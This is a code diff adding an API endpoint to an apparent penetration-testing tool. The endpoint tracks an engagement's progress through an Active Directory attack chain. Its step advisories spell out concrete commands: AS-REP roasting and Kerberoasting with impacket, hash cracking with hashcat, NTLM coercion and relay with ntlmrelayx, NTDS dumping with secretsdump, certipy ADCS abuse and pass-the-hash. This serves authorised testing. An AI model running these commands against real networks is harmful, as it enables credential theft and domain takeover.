@@ -566,6 +566,324 @@ def register_findings_routes(app: FastAPI, ctx) -> None:
         return {"items": items, "total": len(items), "groups": groups,
                 "truncated": truncated}
 
+    # ---- /api/attack-chain/ad — Phase D AD attack-chain walkthrough --------------
+    # A single narrative that walks a tester through the whole AD compromise
+    # story with CURRENT engagement state visible at each step. Every step
+    # reads the same shared-surface unions the KnownAssets tab renders,
+    # plus per-service finding kinds (null_session, ldap_anon_read,
+    # asrep_roast, msrpc_coercion, kerberos_spray_success, adcs-esc*).
+    # A step is "proven" when engagement state satisfies its check, "pending"
+    # otherwise with a next_step advisory naming the exact command to run.
+    @app.get("/api/attack-chain/ad")
+    def attack_chain_ad():
+        import os
+        from ...core import known_domains as _kd
+        from ...core import relay_targets as _rt
+        from ...core.store import Store
+        from ...creds import known_hashes as _kh
+        from ...creds import known_users as _ku
+
+        with Store(db_path) as st:
+            hosts = st.all_hosts()
+            creds = st.all_credentials()
+
+        # Shared-surface reads (mirrors the KnownAssets tab exactly).
+        loot_dir = os.path.join(ctx.eng_dir, "loot")
+        domains_r = _kd.known_domains(hosts, creds=creds)
+        users_r = _ku.known_users(hosts, cap=500)
+        hashes_r = _kh.known_hashes(creds, loot_dir=loot_dir)
+        relay_lines = _rt.relay_target_lines(hosts)
+
+        # Match on script_id OR title (both are lowercased); `kind` is a
+        # tag on the finding dict, and depending on which builder wrote it,
+        # it lands on either the script_id or the title — matching both
+        # keeps us honest across the whole service surface.
+        def _collect(tokens: list[str]) -> list[dict]:
+            out: list[dict] = []
+            for h in hosts:
+                for v in h.vulns:
+                    sid = (v.script_id or "").lower()
+                    ttl = (v.title or "").lower()
+                    if any(t in sid or t in ttl for t in tokens):
+                        out.append({
+                            "finding_kind": v.script_id or v.title or "finding",
+                            "ip": h.ip,
+                            "port": v.port,
+                            "output_excerpt": (v.output or "")[:240],
+                        })
+            return out
+
+        # 1. discover_dc — a host with Kerberos 88 + LDAP 389 + SMB 445 open.
+        #    Proven when known_domains also names a primary DNS domain, so
+        #    "some box has 88 open" doesn't over-claim in the empty case.
+        dc_hosts = []
+        for h in hosts:
+            open_ports = {p.portid for p in h.ports if p.state == "open"}
+            if {88, 389, 445}.issubset(open_ports):
+                dc_hosts.append(h)
+        dc_proven = bool(dc_hosts) and bool(
+            domains_r["primary_dns"] or domains_r["total_known"])
+        dc_evidence = [{
+            "finding_kind": "dc_open_ports",
+            "ip": h.ip, "port": 88,
+            "output_excerpt": (
+                f"Kerberos/LDAP/SMB open — hostname {h.hostname or '(none)'}"
+                + (f" — domain {domains_r['primary_dns']}"
+                   if domains_r['primary_dns'] else "")),
+        } for h in dc_hosts]
+
+        # 2. null_session — SMB null / NTLM info disclosure. Evidence carries
+        #    whichever finding hit; the AV pairs land in the vuln.output.
+        ns_ev = _collect(["null_session", "null / anonymous session",
+                          "smb_ntlm_info_disclosure",
+                          "ntlm information disclosure"])
+
+        # 3. anon_ldap_read — recce.services.ldap emits `ldap_anon_read`
+        #    (also matches the title "Anonymous LDAP read").
+        anon_ev = _collect(["ldap_anon_read", "anonymous ldap read"])
+
+        # 4. user_enum — >=5 unique users unioned across hosts.
+        users_total = int(users_r.get("total_known", 0))
+        user_enum_proven = users_total >= 5
+        user_ev = [{"finding_kind": "known_users", "ip": "",
+                    "port": None,
+                    "output_excerpt": (
+                        f"{users_total} unique user(s) unioned across sources: "
+                        + ", ".join(users_r.get("sources") or []))}] \
+                  if users_total else []
+
+        # 5. unauth_roast — AS-REP roast finding OR mode 18200 hash present.
+        asrep_ev = _collect(["asrep_roast", "as-rep roast"])
+        asrep_mode_count = int(hashes_r.get("by_mode", {}).get(18200, 0))
+        if asrep_mode_count and not asrep_ev:
+            asrep_ev = [{"finding_kind": "asrep_hash", "ip": "",
+                         "port": None,
+                         "output_excerpt": (
+                             f"{asrep_mode_count} AS-REP hash(es) in loot "
+                             f"(hashcat -m 18200)")}]
+
+        # 6. cred_acquired — any non-nthash password/nthash from cracked or
+        #    spray-validated, or any user with an NT hash in by_user.
+        cred_ev: list[dict] = []
+        for c in creds:
+            src = (c.source or "").lower()
+            if c.kind == "password" and ("crack" in src or "spray" in src
+                                          or "validated" in src):
+                cred_ev.append({
+                    "finding_kind": f"credential:{c.kind}", "ip": c.origin_ip,
+                    "port": None,
+                    "output_excerpt": f"{c.label} — password from {src or 'source'}",
+                })
+        if hashes_r.get("by_user"):
+            # Include the user list so the tester sees who to spray.
+            names = sorted(hashes_r["by_user"].keys())[:8]
+            cred_ev.append({
+                "finding_kind": "nthash_by_user", "ip": "", "port": None,
+                "output_excerpt": (f"{len(hashes_r['by_user'])} user(s) with "
+                                   f"a captured hash: {', '.join(names)}"),
+            })
+
+        # 7. coercion_reachable — MSRPC coercion finding OR any relay target.
+        coerce_ev = _collect(["msrpc_coercion", "coercion interfaces"])
+        if relay_lines and not coerce_ev:
+            coerce_ev = [{"finding_kind": "relay_targets", "ip": "",
+                          "port": None,
+                          "output_excerpt": (
+                              f"{len(relay_lines)} relayable host(s): "
+                              + ", ".join(relay_lines[:6]))}]
+        elif relay_lines:
+            coerce_ev.append({"finding_kind": "relay_targets", "ip": "",
+                              "port": None,
+                              "output_excerpt": (
+                                  f"{len(relay_lines)} relayable host(s) "
+                                  "(ntlmrelayx -tf)")})
+
+        # 8. authed_kerberoast — spray-success finding OR any krb5tgs hash.
+        kroast_ev = _collect(["kerberos_spray_success", "kerberos spray"])
+        krb_tgs_users = [u for u, entries in hashes_r.get("by_user", {}).items()
+                         if any(e.get("kind") == "kerberoast" for e in entries)]
+        if krb_tgs_users and not kroast_ev:
+            kroast_ev = [{"finding_kind": "krb5tgs_hash", "ip": "",
+                          "port": None,
+                          "output_excerpt": (
+                              f"{len(krb_tgs_users)} kerberoast blob(s): "
+                              + ", ".join(krb_tgs_users[:6]))}]
+
+        # 9. lsa_or_ntds_dump — any Credential(kind='nthash') exists.
+        nthash_creds = [c for c in creds if c.kind == "nthash"]
+        nthash_ev = [{"finding_kind": "credential:nthash",
+                      "ip": c.origin_ip, "port": None,
+                      "output_excerpt": (
+                          f"{c.label} — NT hash from {c.source or 'source'}")}
+                     for c in nthash_creds[:8]]
+
+        # 10. adcs_esc — any Vuln whose script_id or title flags an ESC.
+        adcs_ev = _collect(["adcs-esc", "adcs_esc", "adcs esc"])
+
+        # 11. da_path — a Credential whose account is Domain Admin (via any
+        #     Account row with admincount=1) AND recce holds either the
+        #     plaintext password or an NT hash.
+        da_names: set[str] = set()
+        for h in hosts:
+            for a in h.accounts or []:
+                if str(a.attrs.get("admincount") or "") == "1":
+                    da_names.add((a.name or "").lower())
+                mo = str(a.attrs.get("memberof") or "").lower()
+                if "domain admins" in mo:
+                    da_names.add((a.name or "").lower())
+        da_ev: list[dict] = []
+        for c in creds:
+            u = (c.username or "").lower()
+            if not u or u not in da_names:
+                continue
+            if c.kind in ("password", "nthash") and c.secret:
+                da_ev.append({
+                    "finding_kind": f"da_credential:{c.kind}",
+                    "ip": c.origin_ip, "port": None,
+                    "output_excerpt": (
+                        f"{c.label} (Domain Admin) — {c.kind} from "
+                        f"{c.source or 'source'}"),
+                })
+
+        # Assemble the ordered step list. Each step's next_step is the
+        # "your next move" advisory the tester needs when the step is
+        # still pending.
+        raw_steps = [
+            ("discover_dc", "Discover a Domain Controller", dc_proven,
+             dc_evidence, [],
+             "Run `recce enum` against the target subnet, focusing on "
+             "88/389/445/636/3268.",
+             ["known_domains"]),
+            ("null_session",
+             "Anonymous SMB / NTLM info disclosure",
+             bool(ns_ev), ns_ev, ["discover_dc"],
+             "nxc smb <dc> -u '' -p '' --shares --users --pass-pol; also "
+             "confirm NTLM SSP with `nmap --script smb-security-mode,smb2-security-mode`.",
+             ["known_domains"]),
+            ("anon_ldap_read",
+             "Anonymous LDAP read",
+             bool(anon_ev), anon_ev, ["discover_dc"],
+             "ldapsearch -x -H ldap://<dc> -b '' -s base '(objectClass=*)' "
+             "namingContexts  # then walk defaultNamingContext for users/groups.",
+             ["known_domains"]),
+            ("user_enum",
+             "Enumerate domain users",
+             user_enum_proven, user_ev,
+             ["null_session", "anon_ldap_read"],
+             "kerbrute userenum --dc <dc> -d <domain> users.txt  # seed users.txt "
+             "from any anonymous read or SMB SAMR you got.",
+             ["known_users"]),
+            ("unauth_roast",
+             "AS-REP roast (no credential)",
+             bool(asrep_ev), asrep_ev, ["user_enum"],
+             "impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt "
+             "-dc-ip <dc>  # then hashcat -m 18200 asrep.hash rockyou.txt.",
+             ["known_users", "known_hashes"]),
+            ("cred_acquired",
+             "Acquire a domain credential",
+             bool(cred_ev), cred_ev,
+             ["user_enum", "unauth_roast"],
+             "After cracking, validate: nxc smb <dc> -u '<user>' -p '<pass>' "
+             "(or -H '<nthash>').",
+             ["known_users", "known_hashes"]),
+            ("coercion_reachable",
+             "Reach a coercion + relay chain",
+             bool(coerce_ev), coerce_ev, ["discover_dc"],
+             "Confirm SMB signing NOT required on member servers "
+             "(relay-targets.txt) + trigger via PetitPotam / PrinterBug / "
+             "DFSCoerce; catch with `ntlmrelayx -tf relay-targets.txt "
+             "-smb2support`.",
+             ["relay_targets"]),
+            ("authed_kerberoast",
+             "Authenticated Kerberoast",
+             bool(kroast_ev), kroast_ev, ["cred_acquired"],
+             "impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc> "
+             "-request  # then hashcat -m 13100 kerberoast.hash rockyou.txt.",
+             ["known_hashes"]),
+            ("lsa_or_ntds_dump",
+             "LSA / NTDS.dit dump",
+             bool(nthash_ev), nthash_ev,
+             ["cred_acquired"],
+             "impacket-secretsdump <domain>/<local-admin>:<pass>@<host>  # or "
+             "on a DC: impacket-secretsdump -just-dc <domain>/<user>@<dc>.",
+             ["known_hashes"]),
+            ("adcs_esc",
+             "ADCS ESC1-ESC16",
+             bool(adcs_ev), adcs_ev, ["cred_acquired"],
+             "certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -vulnerable  "
+             "# then request per the matched ESCn playbook.",
+             []),
+            ("da_path",
+             "Path to Domain Admin",
+             bool(da_ev), da_ev,
+             ["lsa_or_ntds_dump", "authed_kerberoast", "adcs_esc"],
+             "Confirm DA on the DC: nxc smb <dc> -u '<da>' -H '<hash>'; then "
+             "impacket-secretsdump -just-dc <domain>/'<da>'@<dc>.",
+             ["known_users", "known_hashes"]),
+        ]
+
+        step_ids = [s[0] for s in raw_steps]
+        # First pass: proven vs. not-proven per step's own evidence.
+        proven_flags = [bool(t[2]) for t in raw_steps]
+        # Second pass: an unproven step is "blocked" when the tester has
+        # already proven a LATER step in the chain — the walkthrough marks
+        # the leg they skipped past so it stands out as backfill work.
+        # In the empty engagement no step is proven so nothing is blocked.
+        steps_out: list[dict] = []
+        for i, (sid, title, _p, ev, deps, next_step, surfaces) in enumerate(
+                raw_steps):
+            if proven_flags[i]:
+                status = "proven"
+            elif any(proven_flags[j] for j in range(i + 1, len(raw_steps))):
+                status = "blocked"
+            else:
+                status = "pending"
+            steps_out.append({
+                "id": sid,
+                "title": title,
+                "status": status,
+                "evidence": ev,
+                "next_step": "" if status == "proven" else next_step,
+                "depends_on": list(deps),
+                "shared_surfaces_read": list(surfaces),
+            })
+
+        # Summary: counts + furthest proven step (in the declared order) +
+        # single next_action string for the hero card.
+        proven_n = sum(1 for s in steps_out if s["status"] == "proven")
+        pending_n = sum(1 for s in steps_out if s["status"] == "pending")
+        blocked_n = sum(1 for s in steps_out if s["status"] == "blocked")
+        highest = ""
+        for s in steps_out:
+            if s["status"] == "proven":
+                highest = s["id"]
+        # Next action: pick the first blocked-or-pending step in declared
+        # order — that's the leg the tester should actually work on next.
+        # Blocked comes first because it names the skipped-past prereq.
+        next_action = ""
+        for s in steps_out:
+            if s["status"] == "blocked":
+                next_action = s["next_step"]
+                break
+        if not next_action:
+            for s in steps_out:
+                if s["status"] == "pending":
+                    next_action = s["next_step"]
+                    break
+
+        return {
+            "steps": steps_out,
+            "summary": {
+                "proven": proven_n,
+                "pending": pending_n,
+                "blocked": blocked_n,
+                "total": len(steps_out),
+                "highest_reached": highest,
+                "next_action": next_action,
+                "step_ids": step_ids,
+            },
+        }
+
     @app.get("/api/hashloot/categories")
     def hashloot_categories():
         """The hashcat category table — one row per loot file recce knows
